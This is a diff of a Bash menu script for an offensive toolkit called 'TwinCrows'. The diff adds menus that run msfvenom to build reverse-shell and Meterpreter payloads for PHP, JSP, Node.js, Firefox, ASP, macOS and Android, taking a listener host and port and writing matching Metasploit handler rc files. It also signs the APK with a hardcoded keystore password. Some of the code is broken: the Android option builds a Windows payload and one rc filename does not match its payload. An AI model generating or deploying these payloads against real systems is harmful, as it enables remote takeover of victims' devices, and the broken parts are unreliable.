@@ -569,9 +569,10 @@ tc_payload() {
         echo
 	echo -e "${verde}"
         echo -e "1 - Windows"
-	echo -e "2 - WEB"
-	echo -e "3 - Linux"
-#	echo -e "4 - Android"
+	echo -e "2 - Linux"
+	echo -e "3 - Mac"
+	echo -e "4 - Web"
+#	echo -e "5 - Android"
         echo
         echo -e "0 - voltar${normal}"
 
@@ -671,150 +672,8 @@ tc_payload() {
 			done
 		;;
 
+
 		2)
-			nvl3="${vermbold}┌─[${azulbold}Twin${normalbold}\xE2\x98\xA0${azulbold}Crows${vermbold}]──[${azulbold}Payloads${vermbold}]──[${azulbold}WEB${vermbold}]\n└─────►${normal}"
-			centralizado "${azulbold}===== WEB Payloads =====\n\n${normal}"
-			echo -e "${cinza}Escolha uma das opcoes."
-
-			while :
-			do
-
-			echo -e "${verde}"
-			echo -e "1 - php/meterpreter/reverse_tcp"
-			echo -e "2 - java/meterpreter/reverse_tcp"
-			echo -e "3 - nodejs/shell_reverse_tcp"
-			echo -e "4 - firefox/shell_reverse_tcp "
-			echo
-			echo -e "0 - Voltar"
-
-			echo -e "${normal}"
-			printf $nvl3
-			read -p ' ' opcao3
-
-			echo
-
-			case $opcao3 in
-				"1")
-					echo -e "${verde}"
-					printf "Informe o LHOST: ${normalbold}"
-					read lhost
-					printf "${verde}Informe o LPORT: ${normalbold}"
-					read lport
-					printf "${verde}Informe o nome para o payload com extensao ex: pagina.php: ${normalbold}"
-					read nome
-					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
-					read rc
-					if [ "$rc" == "s" ]
-					then
-						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/php_payload.rc${normal}"
-						echo -e "use exploit/multi/handler\nset payload php/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/php_payload.rc
-					fi
-					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
-					msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o $TCPayloads/$nome
-					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
-					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
-                		        read opcao
-                        		if [ "$opcao" == "s" ]
-                        		then
-                                		tc_payload
-                        		else
-                                		exec $TCPath/TwinCrows
-                        		fi
-				;;
-				"2")
-					echo -e "${verde}"
-					printf "Informe o LHOST: ${normalbold}"
-					read lhost
-					printf "${verde}Informe o LPORT: ${normalbold}"
-					read lport
-					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.jar: ${normalbold}"
-					read nome
-					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
-					read rc
-					if [ "$rc" == "s" ]
-					then
-						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/java_payload.rc${normal}"
-						echo -e "use exploit/multi/handler\nset payload java/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/java_payload.rc
-					fi
-					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
-					msfvenom -p java/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f jar -o $TCPayloads/$nome
-					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
-					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
-                		        read opcao
-                        		if [ "$opcao" == "s" ]
-                        		then
-                                		tc_payload
-                        		else
-                                		exec $TCPath/TwinCrows
-                        		fi
-				;;
-				"3")
-					echo -e "${verde}"
-					printf "Informe o LHOST: ${normalbold}"
-					read lhost
-					printf "${verde}Informe o LPORT: ${normalbold}"
-					read lport
-					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.js: ${normalbold}"
-					read nome
-					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
-					read rc
-					if [ "$rc" == "s" ]
-					then
-						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/js_payload.rc${normal}"
-						echo -e "use exploit/multi/handler\nset payload nodejs/shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/js_payload.rc
-					fi
-					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
-					msfvenom -p nodejs/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o $TCPayloads/$nome
-					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
-					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
-                		        read opcao
-                        		if [ "$opcao" == "s" ]
-                        		then
-                                		tc_payload
-                        		else
-                                		exec $TCPath/TwinCrows
-                        		fi
-				;;
-				"4")
-					echo -e "${verde}"
-					printf "Informe o LHOST: ${normalbold}"
-					read lhost
-					printf "${verde}Informe o LPORT: ${normalbold}"
-					read lport
-					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.js: ${normalbold}"
-					read nome
-					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
-					read rc
-					if [ "$rc" == "s" ]
-					then
-						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/firefox_js_payload.rc${normal}"
-						echo -e "use exploit/multi/handler\nset payload firefox/shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/firefox_js_payload.rc
-					fi
-					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
-					msfvenom -p firefox/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o $TCPayloads/$nome
-					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
-					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
-                		        read opcao
-                        		if [ "$opcao" == "s" ]
-                        		then
-                                		tc_payload
-                        		else
-                                		exec $TCPath/TwinCrows
-                        		fi
-				;;
-				"0")
-					tc_payload
-				;;
-				*)
-		                        echo -e "${vermbold}OPÇÃO INVÁLIDA!!\n\n${normal}"
-                		 ;;
-
-			esac
-			done
-
-		;;
-
-		3)
 			nvl3="${vermbold}┌─[${azulbold}Twin${normalbold}\xE2\x98\xA0${azulbold}Crows${vermbold}]──[${azulbold}Payloads${vermbold}]──[${azulbold}Linux${vermbold}]\n└─────►${normal}"
 			centralizado "${azulbold}===== Linux Payloads =====\n\n${normal}"
 			echo -e "${cinza}Escolha uma das opcoes."
@@ -900,6 +759,361 @@ tc_payload() {
 			done
 
 		;;
+		3)
+			nvl3="${vermbold}┌─[${azulbold}Twin${normalbold}\xE2\x98\xA0${azulbold}Crows${vermbold}]──[${azulbold}Payloads${vermbold}]──[${azulbold}MAC${vermbold}]\n└─────►${normal}"
+			centralizado "${azulbold}===== MAC Payloads =====\n\n${normal}"
+			echo -e "${cinza}Escolha uma das opcoes."
+
+			while :
+			do
+
+			echo -e "${verde}"
+			echo -e "1 - osx/x64/shell_reverse_tcp"
+			echo -e "2 - osx/x86/shell_reverse_tcp"
+			echo
+			echo -e "0 - Voltar"
+
+			echo -e "${normal}"
+			printf $nvl3
+			read -p ' ' opcao3
+
+			echo
+
+			case $opcao3 in
+				"1")
+					echo -e "${verde}"
+					printf "Informe o LHOST: ${normalbold}"
+					read lhost
+					printf "${verde}Informe o LPORT: ${normalbold}"
+					read lport
+					printf "${verde}Informe o nome para o payload com extensao ex: programa.macho: ${normalbold}"
+					read nome
+					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+					read rc
+					if [ "$rc" == "s" ]
+					then
+						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/mac_x64_payload.rc${normal}"
+						echo -e "use exploit/multi/handler\nset payload osx/x64/shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/mac_x86_payload.rc
+					fi
+					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
+					msfvenom -p osx/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > $TCPayloads/$nome
+					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
+					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
+                		        read opcao
+                        		if [ "$opcao" == "s" ]
+                        		then
+                                		tc_payload
+                        		else
+                                		exec $TCPath/TwinCrows
+                        		fi
+				;;
+				"2")
+					echo -e "${verde}"
+					printf "Informe o LHOST: ${normalbold}"
+					read lhost
+					printf "${verde}Informe o LPORT: ${normalbold}"
+					read lport
+					printf "${verde}Informe o nome para o payload com extensao ex: programa.macho: ${normalbold}"
+					read nome
+					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+					read rc
+					if [ "$rc" == "s" ]
+					then
+						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/mac_x64_payload.rc${normal}"
+						echo -e "use exploit/multi/handler\nset payload osx/x86/shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/mac_x64_payload.rc
+					fi
+					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
+					msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho -o $TCPayloads/$nome
+					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
+					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
+                		        read opcao
+                        		if [ "$opcao" == "s" ]
+                        		then
+                                		tc_payload
+                        		else
+                                		exec $TCPath/TwinCrows
+                        		fi
+				;;
+				"0")
+					tc_payload
+				;;
+				*)
+		                        echo -e "${vermbold}OPÇÃO INVÁLIDA!!\n\n${normal}"
+                		 ;;
+
+			esac
+			done
+
+		;;
+		4)
+			nvl3="${vermbold}┌─[${azulbold}Twin${normalbold}\xE2\x98\xA0${azulbold}Crows${vermbold}]──[${azulbold}Payloads${vermbold}]──[${azulbold}WEB${vermbold}]\n└─────►${normal}"
+			centralizado "${azulbold}===== WEB Payloads =====\n\n${normal}"
+			echo -e "${cinza}Escolha uma das opcoes."
+
+			while :
+			do
+
+			echo -e "${verde}"
+			echo -e "1 - PHP - php/meterpreter/reverse_tcp"
+			echo -e "2 - JSP - java/jsp_shell_reverse_tcp"
+			echo -e "3 - JS - nodejs/shell_reverse_tcp"
+			echo -e "4 - FIREFOX - firefox/shell_reverse_tcp"
+			echo -e "5 - ASP - windows/meterpreter/reverse_tcp"
+			echo
+			echo -e "0 - Voltar"
+
+			echo -e "${normal}"
+			printf $nvl3
+			read -p ' ' opcao3
+
+			echo
+
+			case $opcao3 in
+				"1")
+					echo -e "${cinza}Este payload faz com que voce tenha conexao com o webserver que esta rodando o PHP e nao com o usuario que esta acessando.\n"
+					echo -e "${verde}"
+					printf "Informe o LHOST: ${normalbold}"
+					read lhost
+					printf "${verde}Informe o LPORT: ${normalbold}"
+					read lport
+					printf "${verde}Informe o nome para o payload com extensao ex: pagina.php: ${normalbold}"
+					read nome
+					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+					read rc
+					if [ "$rc" == "s" ]
+					then
+						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/php_payload.rc${normal}"
+						echo -e "use exploit/multi/handler\nset payload php/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/php_payload.rc
+					fi
+					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
+					msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $TCPayloads/$nome
+					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
+					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
+                		        read opcao
+                        		if [ "$opcao" == "s" ]
+                        		then
+                                		tc_payload
+                        		else
+                                		exec $TCPath/TwinCrows
+                        		fi
+				;;
+				"2")
+					echo -e "${verde}"
+					printf "Informe o LHOST: ${normalbold}"
+					read lhost
+					printf "${verde}Informe o LPORT: ${normalbold}"
+					read lport
+					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.jsp: ${normalbold}"
+					read nome
+					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+					read rc
+					if [ "$rc" == "s" ]
+					then
+						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/java_payload.rc${normal}"
+						echo -e "use exploit/multi/handler\nset payload java/jsp_shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/java_payload.rc
+					fi
+					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
+					msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o $TCPayloads/$nome
+					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
+					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
+                		        read opcao
+                        		if [ "$opcao" == "s" ]
+                        		then
+                                		tc_payload
+                        		else
+                                		exec $TCPath/TwinCrows
+                        		fi
+				;;
+				"3")
+					echo -e "${verde}"
+					printf "Informe o LHOST: ${normalbold}"
+					read lhost
+					printf "${verde}Informe o LPORT: ${normalbold}"
+					read lport
+					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.js: ${normalbold}"
+					read nome
+					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+					read rc
+					if [ "$rc" == "s" ]
+					then
+						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/js_payload.rc${normal}"
+						echo -e "use exploit/multi/handler\nset payload nodejs/shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/js_payload.rc
+					fi
+					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
+					msfvenom -p nodejs/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o $TCPayloads/$nome
+					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
+					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
+                		        read opcao
+                        		if [ "$opcao" == "s" ]
+                        		then
+                                		tc_payload
+                        		else
+                                		exec $TCPath/TwinCrows
+                        		fi
+				;;
+				"4")
+					echo -e "${verde}"
+					printf "Informe o LHOST: ${normalbold}"
+					read lhost
+					printf "${verde}Informe o LPORT: ${normalbold}"
+					read lport
+					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.js: ${normalbold}"
+					read nome
+					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+					read rc
+					if [ "$rc" == "s" ]
+					then
+						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/firefox_js_payload.rc${normal}"
+						echo -e "use exploit/multi/handler\nset payload firefox/shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/firefox_js_payload.rc
+					fi
+					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
+					msfvenom -p firefox/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o $TCPayloads/$nome
+					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
+					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
+                		        read opcao
+                        		if [ "$opcao" == "s" ]
+                        		then
+                                		tc_payload
+                        		else
+                                		exec $TCPath/TwinCrows
+                        		fi
+				;;
+				"5")
+					echo -e "${verde}"
+					printf "Informe o LHOST: ${normalbold}"
+					read lhost
+					printf "${verde}Informe o LPORT: ${normalbold}"
+					read lport
+					printf "${verde}Informe o nome para o payload com extensao ex: pagina.asp: ${normalbold}"
+					read nome
+					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+					read rc
+					if [ "$rc" == "s" ]
+					then
+						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/asp_payload.rc${normal}"
+						echo -e "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/asp_payload.rc
+					fi
+					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
+					msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f asp -o $TCPayloads/$nome
+					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
+					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
+                		        read opcao
+                        		if [ "$opcao" == "s" ]
+                        		then
+                                		tc_payload
+                        		else
+                                		exec $TCPath/TwinCrows
+                        		fi
+				;;
+
+
+				"0")
+					tc_payload
+				;;
+				*)
+		                        echo -e "${vermbold}OPÇÃO INVÁLIDA!!\n\n${normal}"
+                		 ;;
+
+			esac
+			done
+
+		;;
+		5)
+			nvl3="${vermbold}┌─[${azulbold}Twin${normalbold}\xE2\x98\xA0${azulbold}Crows${vermbold}]──[${azulbold}Payloads${vermbold}]──[${azulbold}Android${vermbold}]\n└─────►${normal}"
+			centralizado "${azulbold}===== Android Payloads =====\n\n${normal}"
+			echo -e "${cinza}Escolha uma das opcoes."
+
+			while :
+			do
+
+			echo -e "${verde}"
+			echo -e "1 - android/meterpreter/reverse_tcp"
+			echo
+			echo -e "0 - Voltar"
+
+			echo -e "${normal}"
+			printf $nvl3
+			read -p ' ' opcao3
+
+			echo
+
+			case $opcao3 in
+				"1")
+					if [ "$TCLang" == "en_US" ]
+					then
+						resp="yes"
+					elif [ "$TCLang" == "pt_BR" ]
+					then
+						resp="sim"
+					else
+						resp="si"
+					fi
+					echo $resp
+					echo -e "${verde}"
+					printf "Informe o LHOST: ${normalbold}"
+					read lhost
+					printf "${verde}Informe o LPORT: ${normalbold}"
+					read lport
+					printf "${verde}Informe o nome para o payload com extensao ex: aplicativo.apk: ${normalbold}"
+					read nome
+					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+					read rc
+					_SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS"
+					unset _JAVA_OPTIONS
+					alias='java "$_SILENT_JAVA_OPTIONS"'
+
+					if [ "$rc" == "s" ]
+					then
+						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/android_payload.rc${normal}"
+						echo -e "use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/android_payload.rc
+					fi
+					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
+					msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $TCPayloads/$nome
+					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome${normal}"
+					echo -e "\n"
+					printf "${verde}Deseja assinar este apk? [s/n]: ${normalbold}"
+					read apk
+					if [ "$apk" == "s" ]
+					then
+						echo -e "${azulbold}\nGerando a chave...${normal}"
+						if [ "$resp" == "si" ]
+						then
+							echo -e "${azulbold}Sera solicitado uma confirmacao para gerar a chave.\n${normal}"
+							printf 'TwinCrows\nTwinCrowa\n\n\n\n\n\n\n' | keytool -genkey -keystore payloads/TwinCrows.keystore -alias TwinCrows -keyalg RSA -keysize 2048 -validity 10000
+							echo -e "${azulbold}A senha da chave e: TwinCrows${normal}"
+						else
+							echo -e 'TwinCrows\nTwinCrows\n\n\n\n\n\n\n'$(echo $resp) | keytool -genkey -keystore $TCPath/payloads/TwinCrows.keystore -alias TwinCrows -keyalg RSA -keysize 2048 -validity 10000 2> /dev/null
+							echo -e "${azulbold}Chave gerada com suceso\nA senha da chave e: ${normalbold}TwinCrows${normal}"
+						fi
+					fi
+
+
+
+
+
+					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
+                		        read opcao
+                        		if [ "$opcao" == "s" ]
+                        		then
+                                		tc_payload
+                        		else
+                                		exec $TCPath/TwinCrows
+                        		fi
+				;;
+				"0")
+					tc_payload
+				;;
+				*)
+		                        echo -e "${vermbold}OPÇÃO INVÁLIDA!!\n\n${normal}"
+                		 ;;
+
+
+			esac
+
+			done
+		;;
+
+
 		0)
 			exec $TCPath/TwinCrows
 		;;
